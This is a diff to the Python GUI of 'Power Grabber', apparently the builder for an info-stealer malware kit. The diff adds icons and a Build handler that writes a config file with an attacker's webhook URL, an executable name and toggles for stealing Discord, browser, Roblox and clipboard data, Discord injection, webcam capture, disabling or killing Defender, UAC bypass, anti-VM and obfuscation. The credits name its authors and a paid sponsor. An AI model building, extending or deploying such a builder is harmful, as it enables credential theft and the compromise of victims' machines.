@@ -19,17 +19,23 @@ class Power_Grabber(ctk.CTk):
         self.sidebar = ctk.CTkFrame(self, width=300, fg_color='#212127', corner_radius=0)
         self.sidebar.pack(side=RIGHT, fill=Y)
         url = "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
+        ur ="https://github.com/Powercascade/Power-grabber/blob/main/github.png?raw=true"
+        u = "https://github.com/Powercascade/Power-grabber/blob/main/discord-logo.png?raw=true"
+        URL = "https://github.com/Powercascade/Power-grabber/blob/main/settings.png?raw=true"
         response = requests.get(url)
         image_data = response.content
         image = Image.open(BytesIO(image_data))
         self.logo = ImageTk.PhotoImage(image)
         self.logo_label = ctk.CTkLabel(self.sidebar, image=self.logo, text="")
         self.logo_label.pack(pady=(20, 10))
-        self.sidebar_title = ctk.CTkLabel(self.sidebar, text="Power Grabber", font=('Arial', 30, 'bold'))
-        self.sidebar_title.pack(pady=10)
+        settings_response = requests.get(URL)
+        settings_image_data = settings_response.content
+        settings_image = Image.open(BytesIO(settings_image_data))
+        settings_image = settings_image.resize((20, 20))
+        self.settings_icon = ImageTk.PhotoImage(settings_image)
         self.options_button = ctk.CTkButton(self.sidebar, text="Options", command=self.show_options_page,
                                             fg_color='#FF6B6B', hover_color='#FF3535',
-                                            font=('Arial', 16))
+                                            font=('Arial', 16), image=self.settings_icon, compound="left")
         self.options_button.pack(pady=10)
         self.credits_button = ctk.CTkButton(self.sidebar, text="Credits", command=self.show_credits_page,
                                             fg_color='#FF6B6B', hover_color='#FF3535',
@@ -39,13 +45,23 @@ class Power_Grabber(ctk.CTk):
         self.content_frame.pack(padx=20, pady=20, fill=BOTH, expand=True)
         self.options_page = self.create_options_page()
         self.credits_page = self.create_credits_page()
+        github_response = requests.get(ur)
+        github_image_data = github_response.content
+        github_image = Image.open(BytesIO(github_image_data))
+        github_image = github_image.resize((20, 20))
+        self.github_icon = ImageTk.PhotoImage(github_image)
         self.github_button = ctk.CTkButton(self.sidebar, text="GitHub Repo", command=self.open_github,
-                                           fg_color='#FF6B6B', hover_color='#FF3535',
-                                           font=('Arial', 16))
+                                        fg_color='#FF6B6B', hover_color='#FF3535',
+                                        font=('Arial', 16), image=self.github_icon, compound="left")
         self.github_button.pack(pady=10)
+        discord_response = requests.get(u)
+        discord_image_data = discord_response.content
+        discord_image = Image.open(BytesIO(discord_image_data))
+        discord_image = discord_image.resize((20, 20))
+        self.discord_icon = ImageTk.PhotoImage(discord_image)
         self.discord_button = ctk.CTkButton(self.sidebar, text="Join Discord", command=self.join_discord,
                                             fg_color='#FF6B6B', hover_color='#FF3535',
-                                            font=('Arial', 16))
+                                            font=('Arial', 16), image=self.discord_icon, compound="left")
         self.discord_button.pack(pady=10)
         self.support_button = ctk.CTkButton(self.sidebar, text="Contact Support", command=self.contact_support,
                                     fg_color='#FF6B6B', hover_color='#FF3535',
@@ -57,41 +73,89 @@ class Power_Grabber(ctk.CTk):
         self.free_vbucks_button.pack(pady=10)
     def create_options_page(self):
         page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
-        webhook_entry = ctk.CTkEntry(page, width=320, height=45, 
-                                     fg_color='#333333', text_color='white',
-                                     placeholder_text='Enter Webhook URL:', 
-                                     placeholder_text_color='lightgray',
-                                     border_width=3, corner_radius=15, 
-                                     border_color='#FF6B6B', 
-                                     font=('Arial', 14, 'bold'))
-        webhook_entry.pack(pady=(15, 15))
+        def on_hover(event, widget):
+            widget.configure(border_width=4)
+            widget.configure(border_color="#FF3B3B")
 
-        filename_entry = ctk.CTkEntry(page, width=320, height=45, 
-                                      fg_color='#333333', text_color='white',
-                                      placeholder_text='File name (don\'t type extension)', 
-                                      placeholder_text_color='lightgray',
-                                      border_width=3, corner_radius=15, 
-                                      border_color='#FF6B6B', 
-                                      font=('Arial', 14, 'bold'))
+        def off_hover(event, widget):
+            widget.configure(border_width=3)
+            widget.configure(border_color="#FF6B6B")
+        webhook_entry = ctk.CTkEntry(
+            page,
+            width=600,
+            height=45,
+            fg_color='#333333',
+            text_color='white',
+            placeholder_text='Enter Webhook URL:',
+            placeholder_text_color='lightgray',
+            border_width=3,
+            corner_radius=20,
+            border_color='#FF6B6B', 
+            font=('Arial', 14, 'bold')
+        )
+        webhook_entry.pack(pady=(15, 15))
+        webhook_entry.bind("<Enter>", lambda e: on_hover(e, webhook_entry))
+        webhook_entry.bind("<Leave>", lambda e: off_hover(e, webhook_entry))
+        filename_entry = ctk.CTkEntry(
+            page,
+            width=600,
+            height=45,
+            fg_color='#333333',
+            text_color='white',
+            placeholder_text="File name (don't type extension)",
+            placeholder_text_color='lightgray',
+            border_width=3,
+            corner_radius=20,
+            border_color='#FF6B6B', 
+            font=('Arial', 14, 'bold')
+        )
         filename_entry.pack(pady=(15, 25))
+        filename_entry.bind("<Enter>", lambda e: on_hover(e, filename_entry))
+        filename_entry.bind("<Leave>", lambda e: off_hover(e, filename_entry))
+
         options_label = ctk.CTkLabel(page, text='Options:', 
                                      font=('Arial', 24, 'bold'))
         options_label.pack(pady=(0, 10))
+
         checkbox_options = [
             'Discord Info', 'Browser Info', 'System info', 'Games info', 'Webcam', 
             'Screenshot', 'Self destruction', 'Obfuscate', 'Anti VM', 'Disable defender', 
             'Exact location', 'Vulnerable port creation', 'UAC Bypass', 
             'Send to your computer', 'Roblox account', 'Clipboard contents', 'Discord Injection',
-            'Ping', 'Kill defender (Different than disable)', 'Self exclusion', 'Keylogger'
+            'Ping', 'Kill defender', 'Self exclusion', 'Watch Dog'
         ]
         checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
         checkbox_frame.pack(fill=X)
+        checkbox_dict = {}
         for i, option in enumerate(checkbox_options):
             row = i // 3
             col = i % 3
-            ctk.CTkCheckBox(checkbox_frame, text=option, width=200, height=32,
-                            fg_color='#FF6B6B', text_color='white', 
-                            border_color='#FF3535', corner_radius=12).grid(row=row, column=col, padx=10, pady=5, sticky='w')
+            checkbox = ctk.CTkCheckBox(checkbox_frame, text=option, width=200, height=32,
+                                        fg_color='#FF6B6B', text_color='white', 
+                                        border_color='#FF3535', corner_radius=12)
+            checkbox.grid(row=row, column=col, padx=10, pady=5, sticky='w')
+            checkbox_dict[option] = checkbox
+        discord_info_checkbox = checkbox_dict['Discord Info']
+        browser_info_checkbox = checkbox_dict['Browser Info']
+        system_info_checkbox = checkbox_dict['System info']
+        games_info_checkbox = checkbox_dict['Games info']
+        webcam_checkbox = checkbox_dict['Webcam']
+        screenshot_checkbox = checkbox_dict['Screenshot']
+        self_destruct_checkbox = checkbox_dict['Self destruction']
+        obfuscate_checkbox = checkbox_dict['Obfuscate']
+        anti_vm_checkbox = checkbox_dict['Anti VM']
+        disable_defender_checkbox = checkbox_dict['Disable defender']
+        exact_location_checkbox = checkbox_dict['Exact location']
+        vulnerable_port_creation_checkbox = checkbox_dict['Vulnerable port creation']
+        uac_bypass_checkbox = checkbox_dict['UAC Bypass']
+        send_to_computer_checkbox = checkbox_dict['Send to your computer']
+        roblox_account_checkbox = checkbox_dict['Roblox account']
+        clipboard_contents_checkbox = checkbox_dict['Clipboard contents']
+        discord_injection_checkbox = checkbox_dict['Discord Injection']
+        ping_checkbox = checkbox_dict['Ping']
+        kill_defender_checkbox = checkbox_dict['Kill defender']
+        self_exclusion_checkbox = checkbox_dict['Self exclusion']
+        watchdog_checkbox = checkbox_dict['Watch Dog']
         pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
         pumper_frame.pack(fill=X, pady=(20, 0))
 
@@ -113,14 +177,47 @@ class Power_Grabber(ctk.CTk):
         spacer = ctk.CTkFrame(pumper_frame, width=20, fg_color='transparent')
         spacer.pack(side=LEFT, fill=X, expand=True)
 
-        build_button = ctk.CTkButton(pumper_frame, text="Build", width=200, height=40,
-                                     fg_color='#FF6B6B', hover_color='#FF3535',
-                                     font=('Arial', 18, 'bold'))
-        build_button.pack(side=RIGHT, padx=(0, 10))
-        
+        def build_button_clicked(event):
+            webhook_url = webhook_entry.get()
+            file_name = filename_entry.get()
+            checkbox_statuses = {
+                "Discord-Info": bool(discord_info_checkbox.get()),
+                "Browser-Info": bool(browser_info_checkbox.get()),
+                "System-Info": bool(system_info_checkbox.get()),
+                "Games-Info": bool(games_info_checkbox.get()),
+                "Webcam": bool(webcam_checkbox.get()),
+                "Screenshot": bool(screenshot_checkbox.get()),
+                "Self-destruction": bool(self_destruct_checkbox.get()),
+                "Obfuscate": bool(obfuscate_checkbox.get()),
+                "Anti-VM": bool(anti_vm_checkbox.get()),
+                "Disable-Defender": bool(disable_defender_checkbox.get()),
+                "Location": bool(exact_location_checkbox.get()),
+                "Port-Creation": bool(vulnerable_port_creation_checkbox.get()),
+                "UAC-Bypass": bool(uac_bypass_checkbox.get()),
+                "TCP-IP": bool(send_to_computer_checkbox.get()),
+                "Roblox-Account": bool(roblox_account_checkbox.get()),
+                "Clipboard": bool(clipboard_contents_checkbox.get()),
+                "Discord-Injection": bool(discord_injection_checkbox.get()),
+                "Ping-Users": bool(ping_checkbox.get()),
+                "Kill-Defender": bool(kill_defender_checkbox.get()),
+                "Self-Exclusion": bool(self_exclusion_checkbox.get()),
+                "Watch-Dog": bool(watchdog_checkbox.get()),
+                "Filepumper-Value": pumper_combo.get(),
+                "Ping": ping_combo.get(),
+            }
 
+            with open("config.txt", "w") as file:
+                file.write(f'Webhook: "{webhook_url}"\n')
+                file.write(f'File-Name: "{file_name}.exe"\n')
+
+                for option, status in checkbox_statuses.items():
+                    file.write(f'{option}: {status}\n')
+        build_button = ctk.CTkButton(pumper_frame, text="Build", width=200, height=40,
+                                    fg_color='#FF6B6B', hover_color='#FF3535',
+                                    font=('Arial', 18, 'bold'))
+        build_button.bind("<Button-1>", build_button_clicked)
+        build_button.pack(side=RIGHT, padx=(0, 10))
         return page
-        
     def create_credits_page(self):
         page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
         credits_label = ctk.CTkLabel(page, text="Credits", font=('Arial', 24, 'bold'))
@@ -132,22 +229,19 @@ class Power_Grabber(ctk.CTk):
         - Powercascade
 
         - Developers:
-        - Taktikal.exe
-          Taktikal.exe provided crucial code for this project
-        - Powercascade
-          Powercascade started the project and made most of the code
+        - Taktikal.exe: Provided crucial code for this project
+        - Powercascade: Started the project and made most of the code
 
         - Helpers:
-        - TheOneWhoWatches
-          Watches paid Powercascade $20 to make this project and gave him the idea to make premium
-        - Special thanks:
-        Special thanks to you the user for using Power Grabber. 
-        If you have any issues please contact Powercascade on Discord.
+        - TheOneWhoWatches: Paid Powercascade $20 to make this project and gave him the idea to make premium
 
-        - Existing
+        - Special thanks:
+        - You, the user: For using Power Grabber. If you have any issues, please contact Powercascade on Discord.
+
+        - Existing:
         - LLucas1425
         """
-        credits_textbox = ctk.CTkTextbox(page, width=500, height=300, fg_color='#212127', text_color='white')
+        credits_textbox = ctk.CTkTextbox(page, width=600, height=500, fg_color='#212127', text_color='white')
         credits_textbox.pack(pady=10)
         credits_textbox.insert("1.0", credits_text)
         credits_textbox.configure(state="disabled")
